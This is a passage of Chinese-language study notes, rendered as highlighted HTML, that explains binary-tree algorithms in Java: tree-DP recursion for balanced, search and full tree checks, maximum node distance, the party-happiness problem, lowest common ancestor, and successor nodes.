punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>l <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> r <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> leaf <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x04-二叉树的递归套路（树型DP）"><a href="#0x04-二叉树的递归套路（树型DP）" class="headerlink" title="0x04 二叉树的递归套路（树型DP）"></a>0x04 二叉树的递归套路（树型DP）</h3><p>左树提供什么信息，右树提供什么信息，然后怎么整合返回给上一层的递归</p><p>使用前提： 如果题目求解目标是S规则，则求解流程可以定成以每一个节点为头节点的子树在S规则下的每一个答案，并且最终答案一定在其中</p><blockquote><p>树形dp套路</p><p>1）以某个节点X为头节点的子树中，分析答案有哪些可能性，并且这种分析是以X的左子树、X的右子树和X整棵树的角度来考虑可能性的</p><p>2）根据第一步的可能性分析，列出所有需要的信息</p><p>3）合并第二步的信息，对左树和右树提出同样的要求，并写出需要返回的信息结构</p><p>4）设计递归函数，递归函数是处理以X为头节点的情况下的答案。 包括设计递归的basecase，默认直接得到左树和右树的所有信息，以及把可能性做整合，并且要返回第三步的信息结构这四个小步骤</p></blockquote><h4 id="判断平衡二叉树"><a href="#判断平衡二叉树" class="headerlink" title="判断平衡二叉树"></a>判断平衡二叉树</h4><p>指左子树与右子树高度之差不超过1</p><p>递归过程中，需要左子树和右子树提供的信息为1）是否为平衡二叉树，2）该子树的高度</p><p>那么整棵子树也需要给上一层递归提供同样的上述两个信息，书写递归即可</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> returnType<span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> isBalanced<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> height<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">returnType</span><span class="token punctuation">(</span><span class="token keyword">boolean</span> isBalanced<span class="token punctuation">,</span> <span class="token keyword">int</span> height<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>isBalanced <span class="token operator">=</span> isBalanced<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>height <span class="token operator">=</span> height<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isBalancedTree</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">process</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">.</span>isBalanced<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> returnType <span class="token function">process</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token function">returnType</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    returnType lreturn <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>    returnType rreturn <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">boolean</span> isBalanced <span class="token operator">=</span> <span class="token punctuation">(</span>lreturn<span class="token punctuation">.</span>isBalanced<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>rreturn<span class="token punctuation">.</span>isBalanced<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token punctuation">(</span>lreturn<span class="token punctuation">.</span>height<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>rreturn<span class="token punctuation">.</span>height<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> height <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>lreturn<span class="token punctuation">.</span>height<span class="token punctuation">,</span> rreturn<span class="token punctuation">.</span>height<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token function">returnType</span><span class="token punctuation">(</span>isBalanced<span class="token punctuation">,</span> height<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="判断搜索二叉树"><a href="#判断搜索二叉树" class="headerlink" title="判断搜索二叉树"></a>判断搜索二叉树</h4><p>这里需要左子树提供1）是否为搜索二叉树，2）该树最大值（需要小于根节点），右子树提供1）是否为搜索二叉树，2）该树最小值（需要大于根节点）</p><p>然而，我们需要递归返回同样的信息，现在出现一个需要最大值，一个需要最小值，所以我们选择将两者都返回</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> returnData<span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> isBST<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> max<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> min<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">returnData</span><span class="token punctuation">(</span><span class="token keyword">boolean</span> isBST<span class="token punctuation">,</span> <span class="token keyword">int</span> max<span class="token punctuation">,</span> <span class="token keyword">int</span> min<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>isBST <span class="token operator">=</span> isBST<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>max <span class="token operator">=</span> max<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>min <span class="token operator">=</span> min<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isBST</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">process</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">.</span>isBST<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> returnData <span class="token function">process</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    returnData lData <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>    returnData rData <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> min <span class="token operator">=</span> head<span class="token punctuation">.</span>value<span class="token punctuation">;</span>    <span class="token keyword">int</span> max <span class="token operator">=</span> head<span class="token punctuation">.</span>value<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>lData <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        min <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>lData<span class="token punctuation">.</span>min<span class="token punctuation">,</span> min<span class="token punctuation">)</span><span class="token punctuation">;</span>        max <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>lData<span class="token punctuation">.</span>max<span class="token punctuation">,</span> max<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>rData <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        min <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>rData<span class="token punctuation">.</span>min<span class="token punctuation">,</span> min<span class="token punctuation">)</span><span class="token punctuation">;</span>        max <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>rData<span class="token punctuation">.</span>max<span class="token punctuation">,</span> max<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">boolean</span> isBST <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>lData <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> isBST <span class="token operator">=</span> lData<span class="token punctuation">.</span>isBST <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>lData<span class="token punctuation">.</span>max <span class="token operator">&lt;</span> head<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>rData <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> isBST <span class="token operator">=</span> isBST <span class="token operator">&amp;&amp;</span> rData<span class="token punctuation">.</span>isBST <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>rData<span class="token punctuation">.</span>min <span class="token operator">></span> head<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token function">returnData</span><span class="token punctuation">(</span>isBST<span class="token punctuation">,</span> max<span class="token punctuation">,</span> min<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="判断满二叉树"><a href="#判断满二叉树" class="headerlink" title="判断满二叉树"></a>判断满二叉树</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> returnData<span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> height<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> nodes<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">returnData</span><span class="token punctuation">(</span><span class="token keyword">int</span> h<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>height <span class="token operator">=</span> h<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>nodes <span class="token operator">=</span> n<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isFullBT</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    returnData res <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> res<span class="token punctuation">.</span>height<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">==</span> res<span class="token punctuation">.</span>nodes<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> returnData <span class="token function">process</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token function">returnData</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    returnData lData <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>    returnData rData <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token function">returnData</span><span class="token punctuation">(</span><span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>lData<span class="token punctuation">.</span>height<span class="token punctuation">,</span> rData<span class="token punctuation">.</span>height<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> lData<span class="token punctuation">.</span>nodes <span class="token operator">+</span> rData<span class="token punctuation">.</span>nodes <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="二叉树节点间最大距离"><a href="#二叉树节点间最大距离" class="headerlink" title="二叉树节点间最大距离"></a>二叉树节点间最大距离</h4><p>从二叉树的节点a出发，可以向上或者向下走，但沿途的节点只能经过一次，到达节点b时路径上的节点个数叫作a到b的距离，那么二叉树任何两个节点之间都有距离，求整棵树上的最 大距离</p><p>想得到以x为根节点的树的最大距离，该距离分为两种情况</p><p>1）距离经过了x（x参与），那么想得到最大距离就必须是左子树高度+1+右子树高度</p><p>2）距离不经过x（x不参与），要么是左子树的最大距离，要么是右子树的最大距离</p><p>那么我们需要子树提供的信息就是：</p><p>1）子树的最大距离，2）子树的高度</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> returnData<span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> height<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> distance<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">returnData</span><span class="token punctuation">(</span><span class="token keyword">int</span> h<span class="token punctuation">,</span> <span class="token keyword">int</span> d<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        height <span class="token operator">=</span> h<span class="token punctuation">;</span>        distance <span class="token operator">=</span> d<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">maxDistance</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">process</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">.</span>distance<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> returnData <span class="token function">process</span><span class="token punctuation">(</span><span class="token class-name">Node</span> node<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>node <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token function">returnData</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    returnData left <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>    returnData right <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> dis <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>left<span class="token punctuation">.</span>distance<span class="token punctuation">,</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>right<span class="token punctuation">.</span>distance<span class="token punctuation">,</span> left<span class="token punctuation">.</span>height <span class="token operator">+</span> right<span class="token punctuation">.</span>height <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> hei <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>left<span class="token punctuation">.</span>height<span class="token punctuation">,</span> right<span class="token punctuation">.</span>height<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token function">returnData</span><span class="token punctuation">(</span>hei<span class="token punctuation">,</span> dis<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="最大快乐值（多叉树）"><a href="#最大快乐值（多叉树）" class="headerlink" title="最大快乐值（多叉树）"></a>最大快乐值（多叉树）</h4><p>员工信息的定义如下: </p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Employee</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">public</span> <span class="token keyword">int</span> happy<span class="token punctuation">;</span> <span class="token comment">// 这名员工可以带来的快乐值 </span>    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span> subordinates<span class="token punctuation">;</span> <span class="token comment">// 这名员工有哪些直接下级 </span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>公司的每个员工都符合 Employee 类的描述。整个公司的人员结构可以看作是一棵标准的、 没有环的多叉树。树的头节点是公司唯一的老板。除老板之外的每个员工都有唯一的直接上级。 叶节点是没有任何下属的基层员工(subordinates列表为空)，除基层员工外，每个员工都有一个或多个直接下级。 </p><p>这个公司现在要办party，你可以决定哪些员工来，哪些员工不来。但是要遵循如下规则</p><p>1）如果某个员工来了，那么这个员工的所有直接下级都不能来 </p><p>2）派对的整体快乐值是所有到场员工快乐值的累加 </p><p>3）你的目标是让派对的整体快乐值尽量大 </p><p>给定一棵多叉树的头节点boss，请返回派对的最大快乐值</p><p>想得到以x为根节点的树的最大快乐值，同样分为两种情况：</p><p>1）x参与，快乐值为x.happy + {所有直接下级不来的整颗子树的最大快乐值}</p><p>2）x不参与，快乐值为0 + {所有直接下级max(直接下级来的整颗子树的最大值，直接下级不来的整颗子树的最大值)}</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> returnData<span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> present<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> absent<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">returnData</span><span class="token punctuation">(</span><span class="token keyword">int</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        present <span class="token operator">=</span> p<span class="token punctuation">;</span>        absent <span class="token operator">=</span> a<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">maxHappy</span><span class="token punctuation">(</span><span class="token class-name">Employee</span> boss<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        returnData bos <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>boss<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>bos<span class="token punctuation">.</span>present<span class="token punctuation">,</span> bos<span class="token punctuation">.</span>absent<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> returnData <span class="token function">process</span><span class="token punctuation">(</span><span class="token class-name">Employee</span> employee<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> employee<span class="token punctuation">.</span>subordinates<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token function">returnData</span><span class="token punctuation">(</span>employee<span class="token punctuation">.</span>happy<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> p <span class="token operator">=</span> employee<span class="token punctuation">.</span>happy<span class="token punctuation">;</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Employee</span> each<span class="token operator">:</span>list<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        returnData emplo <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>each<span class="token punctuation">)</span><span class="token punctuation">;</span>        p <span class="token operator">+=</span> emplo<span class="token punctuation">.</span>absent<span class="token punctuation">;</span>        a <span class="token operator">+=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>emplo<span class="token punctuation">.</span>present<span class="token punctuation">,</span> emplo<span class="token punctuation">.</span>absent<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token function">returnData</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="最低公共祖先节点"><a href="#最低公共祖先节点" class="headerlink" title="最低公共祖先节点"></a>最低公共祖先节点</h3><p>给定两个二叉树的节点node1和node2，找到他们的最低公共祖先节点</p><p>如果有公共祖先，只有下面两种情况</p><p>1）node1和node2，其中一个是另一个的祖先</p><p>2）都往上找，找到一个节点为公共祖先</p><p>使用递归遍历整棵树（代码不好理解）</p><p>base case：当前节点为空/node1/node2，返回当前节点</p><p>递归左右子树，然后如果两侧的结果都不为空的话，说明是情况 2），将当前节点往上层返回即可，否则说明至少有一侧为空，那么返回不为空的那一侧即可（两侧都为空，返回空）</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Node</span> <span class="token function">lowestCommonAncestor</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">,</span> <span class="token class-name">Node</span> o1<span class="token punctuation">,</span> <span class="token class-name">Node</span> o2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> head <span class="token operator">==</span> o1 <span class="token operator">||</span> head <span class="token operator">==</span> o2<span class="token punctuation">)</span> <span class="token keyword">return</span> head<span class="token punctuation">;</span>    <span class="token class-name">Node</span> left <span class="token operator">=</span> <span class="token function">lowestCommonAncestor</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>left<span class="token punctuation">,</span> o1<span class="token punctuation">,</span> o2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> right <span class="token operator">=</span> <span class="token function">lowestCommonAncestor</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>right<span class="token punctuation">,</span> o1<span class="token punctuation">,</span> o2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>left <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> right <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> head<span class="token punctuation">;</span>    <span class="token keyword">return</span> left <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">?</span> left <span class="token operator">:</span> right<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="后继节点"><a href="#后继节点" class="headerlink" title="后继节点"></a>后继节点</h3><p>即中序遍历中的下一个节点</p><p>节点类型添加了一个指向父节点的指针，根节点的父节点为null</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Node</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> value<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Node</span> left<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Node</span> right<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Node</span> parent<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Node</span><span class="token punctuation">(</span><span class="token keyword">int</span> val<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        value <span class="token operator">=</span> val<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>显然题意并不想让我们中序遍历整棵树，从而得出后继节点，这样的复杂度是O（n），但是有了父节点的帮助，我们可以优化到O（k），k为该节点与后继节点的高度差</p><p>这就需要我们理解树的结构，节点分为两种情况</p><p>1）该节点有右子树 - 返回右子树的最左边的子节点</p><p>2）无右子树 - 向上找，如果不是父亲的左孩子，继续向上，找到第一个是父亲的左孩子为止，那么该父亲即为后继节点</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Node</span> <span class="token function">successorNode</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">,</span> <span class="token class-name">Node</span> node<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> node <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> cur <span class="token operator">=</span> node<span class="token 